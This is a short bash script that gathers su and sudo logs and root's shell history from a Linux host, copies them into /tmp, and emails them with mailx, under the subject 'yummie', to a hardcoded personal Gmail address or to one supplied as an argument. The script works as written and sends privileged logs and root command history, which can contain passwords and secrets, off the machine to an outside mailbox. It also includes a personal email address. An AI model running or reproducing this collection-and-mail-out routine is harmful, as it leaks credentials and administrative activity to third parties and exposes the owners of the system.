#!/bin/bash -e
# This script will run on any Linux
# This script will fail on many Solaris, AIX, or UNIX systems w/o bash installed
# 
# $1 arguement can be an alternate e-mail to send to

PERSON="cgseller@gmail.com"


if [[ $1 =~ .*-h.* ]]
then
   printf "\n USAGE: \n\n\t $0 [email@address.tld]\n"
   printf "\n\tdefault address = $PERSON  if omitted\n\n"
   exit;
fi

if [[ $1 =~ "\@" ]]
then
   PERSON=$1
   echo "Sending output to $PERSON..."
fi

# find all possible files matching the criteria below
SULOG=$(find -L /var -name su.log 2>/dev/null)
SUDOLOG=$(find -L /var -name sudo.log 2>/dev/null)
ROOTHIST=$(find -L ~root/*history* 2>/dev/null)

#====================================================


for items in SULOG SUDOLOG ROOTHIST
do
    echo " >> Gathering $items contents...."
    # ${!items} will expand the value of items as a variable
    for file in ${!items}
    do
        TEMPFILE=$(basename $file)
        echo "Merging $file into $TEMPFILE.txt..."
        cat $file | tee -a /tmp/$TEMPFILE.txt 2>&1 > /dev/null
    done
    echo "Sending gathered content of $items to $PERSON..."
    cat /tmp/$TEMPFILE.txt | mailx -s "yummie $items" $PERSON
done

